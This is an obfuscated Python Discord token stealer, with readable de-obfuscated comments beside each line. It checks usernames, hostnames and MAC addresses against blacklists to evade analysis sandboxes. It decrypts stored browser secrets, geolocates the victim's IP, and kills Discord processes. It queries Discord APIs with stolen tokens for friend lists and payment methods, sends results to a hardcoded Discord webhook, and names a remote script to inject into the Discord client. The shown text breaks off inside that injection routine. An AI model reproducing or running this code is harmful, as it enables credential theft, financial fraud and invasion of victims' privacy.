import os #line:1:import os
import threading #line:2:import threading
from sys import executable #line:3:from sys import executable
from sqlite3 import connect as sql_connect #line:4:from sqlite3 import connect as sql_connect
import re #line:5:import re
from base64 import b64decode #line:6:from base64 import b64decode
from json import loads as json_loads ,load #line:7:from json import loads as json_loads, load
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8:from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib .request import Request ,urlopen #line:9:from urllib.request import Request, urlopen
from json import *#line:10:from json import *
import time #line:11:import time
import shutil #line:12:import shutil
from zipfile import ZipFile #line:13:from zipfile import ZipFile
import random #line:14:import random
import re #line:15:import re
import subprocess #line:16:import subprocess
import sys #line:17:import sys
import shutil #line:18:import shutil
import uuid #line:19:import uuid
import socket #line:20:import socket
import getpass #line:21:import getpass
import ssl #line:22:import ssl
ssl ._create_default_https_context =ssl ._create_unverified_context #line:26:ssl._create_default_https_context = ssl._create_unverified_context
blacklistUsers =['WDAGUtilityAccount','3W1GJT','QZSBJVWM','5ISYH9SH','Abby','hmarc','patex','RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl','fred','server','BvJChRPnsxn','Harry Johnson','SqgFOf3G','Lucas','mike','PateX','h7dk1xPr','Louise','User01','test','RGzcBUyrznReg']#line:28:blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
username =getpass .getuser ()#line:30:username = getpass.getuser()
if username .lower ()in blacklistUsers :#line:32:if username.lower() in blacklistUsers:
    os ._exit (0 )#line:33:os._exit(0)
def kontrol ():#line:35:def kontrol():
    O000OOO00O00000O0 =['BEE7370C-8C0C-4','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC','JOHN-PC','DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH','NETTYPC','DESKTOP-BUGIO','DESKTOP-CBGPFEE','SERVER-PC','TIQIYLA9TW5M','DESKTOP-KALVINO','COMPNAME_4047','DESKTOP-19OLLTD','DESKTOP-DE369SE','EA8C2E2A-D017-4','AIDANPC','LUCAS-PC','MARCI-PC','ACEPC','MIKE-PC','DESKTOP-IAPKN1P','DESKTOP-NTU7VUO','LOUISE-PC','T00917','test42']#line:37:blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
    OO000O0OO000OO000 =socket .gethostname ()#line:39:hostname = socket.gethostname()
    if any (OO00000OO0O00O000 in OO000O0OO000OO000 for OO00000OO0O00O000 in O000OOO00O00000O0 ):#line:41:if any(name in hostname for name in blacklistUsername):
        os ._exit (0 )#line:42:os._exit(0)
kontrol ()#line:44:kontrol()
BLACKLIST1 =['00:15:5d:00:07:34','00:e0:4c:b8:7a:58','00:0c:29:2c:c1:21','00:25:90:65:39:e4','c8:9f:1d:b6:58:e4','00:25:90:36:65:0c','00:15:5d:00:00:f3','2e:b8:24:4d:f7:de','00:15:5d:13:6d:0c','00:50:56:a0:dd:00','00:15:5d:13:66:ca','56:e8:92:2e:76:0d','ac:1f:6b:d0:48:fe','00:e0:4c:94:1f:20','00:15:5d:00:05:d5','00:e0:4c:4b:4a:40','42:01:0a:8a:00:22','00:1b:21:13:15:20','00:15:5d:00:06:43','00:15:5d:1e:01:c8','00:50:56:b3:38:68','60:02:92:3d:f1:69','00:e0:4c:7b:7b:86','00:e0:4c:46:cf:01','42:85:07:f4:83:d0','56:b0:6f:ca:0a:e7','12:1b:9e:3c:a6:2c','00:15:5d:00:1c:9a','00:15:5d:00:1a:b9','b6:ed:9d:27:f4:fa','00:15:5d:00:01:81','4e:79:c0:d9:af:c3','00:15:5d:b6:e0:cc','00:15:5d:00:02:26','00:50:56:b3:05:b4','1c:99:57:1c:ad:e4','08:00:27:3a:28:73','00:15:5d:00:00:c3','00:50:56:a0:45:03','12:8a:5c:2a:65:d1','00:25:90:36:f0:3b','00:1b:21:13:21:26','42:01:0a:8a:00:22','00:1b:21:13:32:51','a6:24:aa:ae:e6:12','08:00:27:45:13:10','00:1b:21:13:26:44','3c:ec:ef:43:fe:de','d4:81:d7:ed:25:54','00:25:90:36:65:38','00:03:47:63:8b:de','00:15:5d:00:05:8d','00:0c:29:52:52:50','00:50:56:b3:42:33','3c:ec:ef:44:01:0c','06:75:91:59:3e:02','42:01:0a:8a:00:33','ea:f6:f1:a2:33:76','ac:1f:6b:d0:4d:98','1e:6c:34:93:68:64','00:50:56:a0:61:aa','42:01:0a:96:00:22','00:50:56:b3:21:29','00:15:5d:00:00:b3','96:2b:e9:43:96:76','b4:a9:5a:b1:c6:fd','d4:81:d7:87:05:ab','ac:1f:6b:d0:49:86','52:54:00:8b:a6:08','00:0c:29:05:d8:6e','00:23:cd:ff:94:f0','00:e0:4c:d6:86:77','3c:ec:ef:44:01:aa','00:15:5d:23:4c:a3','00:1b:21:13:33:55','00:15:5d:00:00:a4','16:ef:22:04:af:76','00:15:5d:23:4c:ad','1a:6c:62:60:3b:f4','00:15:5d:00:00:1d','00:50:56:a0:cd:a8','00:50:56:b3:fa:23','52:54:00:a0:41:92','00:50:56:b3:f6:57','00:e0:4c:56:42:97','ca:4d:4b:ca:18:cc','f6:a5:41:31:b2:78','d6:03:e4:ab:77:8e','00:50:56:ae:b2:b0','00:50:56:b3:94:cb','42:01:0a:8e:00:22','00:50:56:b3:4c:bf','00:50:56:b3:09:9e','00:50:56:b3:38:88','00:50:56:a0:d0:fa','00:50:56:b3:91:c8','3e:c1:fd:f1:bf:71','00:50:56:a0:6d:86','00:50:56:a0:af:75','00:50:56:b3:dd:03','c2:ee:af:fd:29:21','00:50:56:b3:ee:e1','00:50:56:a0:84:88','00:1b:21:13:32:20','3c:ec:ef:44:00:d0','00:50:56:ae:e5:d5','00:50:56:97:f6:c8','52:54:00:ab:de:59','00:50:56:b3:9e:9e','00:50:56:a0:39:18','32:11:4d:d0:4a:9e','00:50:56:b3:d0:a7','94:de:80:de:1a:35','00:50:56:ae:5d:ea','00:50:56:b3:14:59','ea:02:75:3c:90:9f','00:e0:4c:44:76:54','ac:1f:6b:d0:4d:e4','52:54:00:3b:78:24','00:50:56:b3:50:de','7e:05:a3:62:9c:4d','52:54:00:b3:e4:71','90:48:9a:9d:d5:24','00:50:56:b3:3b:a6','92:4c:a8:23:fc:2e','5a:e2:a6:a4:44:db','00:50:56:ae:6f:54','42:01:0a:96:00:33','00:50:56:97:a1:f8','5e:86:e4:3d:0d:f6','00:50:56:b3:ea:ee','3e:53:81:b7:01:13','00:50:56:97:ec:f2','00:e0:4c:b3:5a:2a','12:f8:87:ab:13:ec','00:50:56:a0:38:06','2e:62:e8:47:14:49','00:0d:3a:d2:4f:1f','60:02:92:66:10:79','','00:50:56:a0:d7:38','be:00:e5:c5:0c:e5','00:50:56:a0:59:10','00:50:56:a0:06:8d','00:e0:4c:cb:62:08','4e:81:81:8e:22:4e']#line:46:BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
mac_address =uuid .getnode ()#line:48:mac_address = uuid.getnode()
if str (uuid .UUID (int =mac_address ))in BLACKLIST1 :#line:49:if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os ._exit (0 )#line:50:os._exit(0)
wh00k ="https://discord.com/api/webhooks/1131571611468832829/-SeNl2GPpGRXek9BCpSOxydxQat-LDtuHsIIyQ1pvy0ud_s5rNLXHYW2bup_coQrzPsC"#line:55:wh00k = "https://discord.com/api/webhooks/1131571611468832829/-SeNl2GPpGRXek9BCpSOxydxQat-LDtuHsIIyQ1pvy0ud_s5rNLXHYW2bup_coQrzPsC"
inj_url ="https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"#line:56:inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
DETECTED =False #line:58:DETECTED = False
def g3t1p ():#line:60:def g3t1p():
    O00OO0O00O00OOOOO ="None"#line:61:ip = "None"
    try :#line:62:try:
        O00OO0O00O00OOOOO =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:63:ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except :#line:64:except:
        pass #line:65:pass
    return O00OO0O00O00OOOOO #line:66:return ip
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:71:]
for modl in requirements :#line:72:for modl in requirements:
    try :__import__ (modl [0 ])#line:73:try: __import__(modl[0])
    except :#line:74:except:
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:75:subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time .sleep (3 )#line:76:time.sleep(3)
import requests #line:78:import requests
from Crypto .Cipher import AES #line:79:from Crypto.Cipher import AES
local =os .getenv ('LOCALAPPDATA')#line:81:local = os.getenv('LOCALAPPDATA')
roaming =os .getenv ('APPDATA')#line:82:roaming = os.getenv('APPDATA')
temp =os .getenv ("TEMP")#line:83:temp = os.getenv("TEMP")
Threadlist =[]#line:84:Threadlist = []
class DATA_BLOB (Structure ):#line:87:class DATA_BLOB(Structure):
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:91:]
def G3tD4t4 (OOOO0OO0OOOOO0O00 ):#line:93:def G3tD4t4(blob_out):
    OOOOOOOOO0O0O000O =int (OOOO0OO0OOOOO0O00 .cbData )#line:94:cbData = int(blob_out.cbData)
    OOO00OO000O0OOOO0 =OOOO0OO0OOOOO0O00 .pbData #line:95:pbData = blob_out.pbData
    OO0OO0O0OO000O0O0 =c_buffer (OOOOOOOOO0O0O000O )#line:96:buffer = c_buffer(cbData)
    cdll .msvcrt .memcpy (OO0OO0O0OO000O0O0 ,OOO00OO000O0OOOO0 ,OOOOOOOOO0O0O000O )#line:97:cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll .kernel32 .LocalFree (OOO00OO000O0OOOO0 )#line:98:windll.kernel32.LocalFree(pbData)
    return OO0OO0O0OO000O0O0 .raw #line:99:return buffer.raw
def CryptUnprotectData (O00O0OOOO0OO00O0O ,OO0OO0OO00OO0OO00 =b''):#line:101:def CryptUnprotectData(encrypted_bytes, entropy=b''):
    OOO000OOO00OOOO00 =c_buffer (O00O0OOOO0OO00O0O ,len (O00O0OOOO0OO00O0O ))#line:102:buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    OOOO00000O0OOO0O0 =c_buffer (OO0OO0OO00OO0OO00 ,len (OO0OO0OO00OO0OO00 ))#line:103:buffer_entropy = c_buffer(entropy, len(entropy))
    OOO0O0000OO00000O =DATA_BLOB (len (O00O0OOOO0OO00O0O ),OOO000OOO00OOOO00 )#line:104:blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    OO0O0000O0O0000O0 =DATA_BLOB (len (OO0OO0OO00OO0OO00 ),OOOO00000O0OOO0O0 )#line:105:blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    OO00OO00OOOOOOO00 =DATA_BLOB ()#line:106:blob_out = DATA_BLOB()
    if windll .crypt32 .CryptUnprotectData (byref (OOO0O0000OO00000O ),None ,byref (OO0O0000O0O0000O0 ),None ,None ,0x01 ,byref (OO00OO00OOOOOOO00 )):#line:108:if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4 (OO00OO00OOOOOOO00 )#line:109:return G3tD4t4(blob_out)
def D3kryptV4lU3 (O0OO0O00O00O0O0OO ,O0OOOOO0O000OO0OO =None ):#line:111:def D3kryptV4lU3(buff, master_key=None):
    O00OO00OO00000OO0 =O0OO0O00O00O0O0OO .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:112:starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if O00OO00OO00000OO0 =='v10'or O00OO00OO00000OO0 =='v11':#line:113:if starts == 'v10' or starts == 'v11':
        OOOOOOOOOO00O0OOO =O0OO0O00O00O0O0OO [3 :15 ]#line:114:iv = buff[3:15]
        O00O00OO0O0O0O00O =O0OO0O00O00O0O0OO [15 :]#line:115:payload = buff[15:]
        O000000O00000OOO0 =AES .new (O0OOOOO0O000OO0OO ,AES .MODE_GCM ,OOOOOOOOOO00O0OOO )#line:116:cipher = AES.new(master_key, AES.MODE_GCM, iv)
        OOO0O00OOO00OO0O0 =O000000O00000OOO0 .decrypt (O00O00OO0O0O0O00O )#line:117:decrypted_pass = cipher.decrypt(payload)
        OOO0O00OOO00OO0O0 =OOO0O00OOO00OO0O0 [:-16 ].decode ()#line:118:decrypted_pass = decrypted_pass[:-16].decode()
        return OOO0O00OOO00OO0O0 #line:119:return decrypted_pass
def L04dR3qu3sTs (O00O0O0OOO0O0O0OO ,OOO0OOOO00000OO00 ,OO000OOOOOO0OOO0O ='',OOO0O00O0O00OOOOO ='',OO00O0OOO00OO0000 =''):#line:121:def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for OOO00O0O00000OOOO in range (8 ):#line:122:for i in range(8):
        try :#line:123:try:
            if O00O0O0OOO0O0O0OO =='POST':#line:124:if methode == 'POST':
                if OO000OOOOOO0OOO0O !='':#line:125:if data != '':
                    OOO0OO000OO0O00OO =requests .post (OOO0OOOO00000OO00 ,data =OO000OOOOOO0OOO0O )#line:126:r = requests.post(url, data=data)
                    if OOO0OO000OO0O00OO .status_code ==200 :#line:127:if r.status_code == 200:
                        return OOO0OO000OO0O00OO #line:128:return r
                elif OOO0O00O0O00OOOOO !='':#line:129:elif files != '':
                    OOO0OO000OO0O00OO =requests .post (OOO0OOOO00000OO00 ,files =OOO0O00O0O00OOOOO )#line:130:r = requests.post(url, files=files)
                    if OOO0OO000OO0O00OO .status_code ==200 or OOO0OO000OO0O00OO .status_code ==413 :#line:131:if r.status_code == 200 or r.status_code == 413:
                        return OOO0OO000OO0O00OO #line:132:return r
        except :#line:133:except:
            pass #line:134:pass
def L04durl1b (OOOOOO0000000OOO0 ,O00000OOO000O00OO ='',OO00OOO000O00OOO0 ='',O00OOOO000O0O0O00 =''):#line:136:def L04durl1b(wh00k, data='', files='', headers=''):
    for O000OO0OO0000O0OO in range (8 ):#line:137:for i in range(8):
        try :#line:138:try:
            if O00OOOO000O0O0O00 !='':#line:139:if headers != '':
                OOOO00000O00OOO00 =urlopen (Request (OOOOOO0000000OOO0 ,data =O00000OOO000O00OO ,headers =O00OOOO000O0O0O00 ))#line:140:r = urlopen(Request(wh00k, data=data, headers=headers))
                return OOOO00000O00OOO00 #line:141:return r
            else :#line:142:else:
                OOOO00000O00OOO00 =urlopen (Request (OOOOOO0000000OOO0 ,data =O00000OOO000O00OO ))#line:143:r = urlopen(Request(wh00k, data=data))
                return OOOO00000O00OOO00 #line:144:return r
        except :#line:145:except:
            pass #line:146:pass
def globalInfo ():#line:148:def globalInfo():
    O000OOOOO00O00OO0 =g3t1p ()#line:149:ip = g3t1p()
    OO0OOO000O0OOO0OO =os .getenv ("USERNAME")#line:150:us3rn4m1 = os.getenv("USERNAME")
    OOOOOO00OO0O000OO =urlopen (Request (f"https://geolocation-db.com/jsonp/{O000OOOOO00O00OO0}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:151:ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    OO0OO00OO000O000O =loads (OOOOOO00OO0O000OO )#line:153:ipdata = loads(ipdatanojson)
    O0O0O00OO0000O0OO =OO0OO00OO000O000O ["country_name"]#line:155:contry = ipdata["country_name"]
    O00O0O0O0O0OOOO0O =OO0OO00OO000O000O ["country_code"].lower ()#line:156:contryCode = ipdata["country_code"].lower()
    O00OOO00OOO0O0OO0 =OO0OO00OO000O000O ["state"]#line:157:sehir = ipdata["state"]
    O00O0000OO0OO0O00 =f":flag_{O00O0O0O0O0OOOO0O}:  - `{OO0OOO000O0OOO0OO.upper()} | {O000OOOOO00O00OO0} ({O0O0O00OO0000O0OO})`"#line:159:globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return O00O0000OO0OO0O00 #line:160:return globalinfo
def TR6st (OO00000O0O0O00O0O ):#line:163:def TR6st(C00k13):
    global DETECTED #line:165:global DETECTED
    O0000O00O0O0OO00O =str (OO00000O0O0O00O0O )#line:166:data = str(C00k13)
    OO0O0O00000OOOOO0 =re .findall (".google.com",O0000O00O0O0OO00O )#line:167:tim = re.findall(".google.com", data)
    if len (OO0O0O00000OOOOO0 )<-1 :#line:169:if len(tim) < -1:
        DETECTED =True #line:170:DETECTED = True
        return DETECTED #line:171:return DETECTED
    else :#line:172:else:
        DETECTED =False #line:173:DETECTED = False
        return DETECTED #line:174:return DETECTED
def G3tUHQFr13ndS (O0O0OO0O00O0O000O ):#line:176:def G3tUHQFr13ndS(t0k3n):
    O00OO000OOOOOOO0O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:188:]
    O0O00OOO0OOO0OO00 ={"Authorization":O0O0OO0O00O0O000O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:193:}
    try :#line:194:try:
        O0000OOOOOO0OOOOO =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =O0O00OOO0OOO0OO00 )).read ().decode ())#line:195:friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except :#line:196:except:
        return False #line:197:return False
    O0O000000OOO0O00O =''#line:199:uhqlist = ''
    for OO0O0OOO0OO0O000O in O0000OOOOOO0OOOOO :#line:200:for friend in friendlist:
        OO0OOO0O0O0OO0OOO =''#line:201:Own3dB3dg4s = ''
        O00O000O0000OOO0O =OO0O0OOO0OO0O000O ['user']['public_flags']#line:202:flags = friend['user']['public_flags']
        for OO0OO0OO0O00OOOO0 in O00OO000OOOOOOO0O :#line:203:for b4dg3 in b4dg3List:
            if O00O000O0000OOO0O //OO0OO0OO0O00OOOO0 ["Value"]!=0 and OO0O0OOO0OO0O000O ['type']==1 :#line:204:if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House"in OO0OO0OO0O00OOOO0 ["Name"]:#line:205:if not "House" in b4dg3["Name"]:
                    OO0OOO0O0O0OO0OOO +=OO0OO0OO0O00OOOO0 ["Emoji"]#line:206:Own3dB3dg4s += b4dg3["Emoji"]
                O00O000O0000OOO0O =O00O000O0000OOO0O %OO0OO0OO0O00OOOO0 ["Value"]#line:207:flags = flags % b4dg3["Value"]
        if OO0OOO0O0O0OO0OOO !='':#line:208:if Own3dB3dg4s != '':
            O0O000000OOO0O00O +=f"{OO0OOO0O0O0OO0OOO} | {OO0O0OOO0OO0O000O['user']['username']}#{OO0O0OOO0OO0O000O['user']['discriminator']} ({OO0O0OOO0OO0O000O['user']['id']})\n"#line:209:uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return O0O000000OOO0O00O #line:210:return uhqlist
process_list =os .popen ('tasklist').readlines ()#line:213:process_list = os.popen('tasklist').readlines()
for process in process_list :#line:216:for process in process_list:
    if "Discord"in process :#line:217:if "Discord" in process:
        pid =int (process .split ()[1 ])#line:219:pid = int(process.split()[1])
        os .system (f"taskkill /F /PID {pid}")#line:220:os.system(f"taskkill /F /PID {pid}")
def G3tb1ll1ng (O00OOO0O00OOOOOOO ):#line:222:def G3tb1ll1ng(t0k3n):
    O0O0O0OOOO0O000OO ={"Authorization":O00OOO0O00OOOOOOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:227:}
    try :#line:228:try:
        OOO0O00OOO0000OOO =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =O0O0O0OOOO0O000OO )).read ().decode ())#line:229:b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except :#line:230:except:
        return False #line:231:return False
    if OOO0O00OOO0000OOO ==[]:return "```None```"#line:233:if b1ll1ngjson == []: return "```None```"
    O00O00O00000O0OO0 =""#line:235:b1ll1ng = ""
    for O00O00OOOOO000OO0 in OOO0O00OOO0000OOO :#line:236:for methode in b1ll1ngjson:
        if O00O00OOOOO000OO0 ["invalid"]==False :#line:237:if methode["invalid"] == False:
            if O00O00OOOOO000OO0 ["type"]==1 :#line:238:if methode["type"] == 1:
                O00O00O00000O0OO0 +=":credit_card:"#line:239:b1ll1ng += ":credit_card:"
            elif O00O00OOOOO000OO0 ["type"]==2 :#line:240:elif methode["type"] == 2:
                O00O00O00000O0OO0 +=":parking: "#line:241:b1ll1ng += ":parking: "
    return O00O00O00000O0OO0 #line:243:return b1ll1ng
def inj_discord ():#line:245:def inj_discord():
    O0O00O0OOOOO0OOOO =os .getlogin ()#line:247:username = os.getlogin()
    OO0O00OOOO00O0OO0 =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:249:folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
    for OO0O0000000O00000 in OO0O00OOOO00O0OO0 :#line:251:for folder_name in folder_list:
        OOOO0OO00O00OO00O =os .path .join (os .getenv ('LOCALAPPDATA'),OO0O0000000O00000 )#line:252:deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os .path .isdir (OOOO0OO00O00OO00O ):#line:253:if os.path.isdir(deneme_path):
            for OOOO0O000O00OO00O ,O00O000O0000000OO ,O0OO000O00OOO0O0O in os .walk (OOOO0OO00O00OO00O ):#line:254:for subdir, dirs, files in os.walk(deneme_path):
                if 'app-'in OOOO0O000O00OO00O :#line:255:if 'app-' in subdir:
                    for OO0O0O00000000O0O in O00O000O0000000OO :#line:256:for dir in dirs:
                        if 'modules'in OO0O0O00000000O0O :#line:257:if 'modules' in dir:
                            O0O0OOOO0OOO00OOO =os .path .join (OOOO0O000O00OO00O ,OO0O0O00000000O0O )#line:258:module_path = os.path.join(subdir, dir)
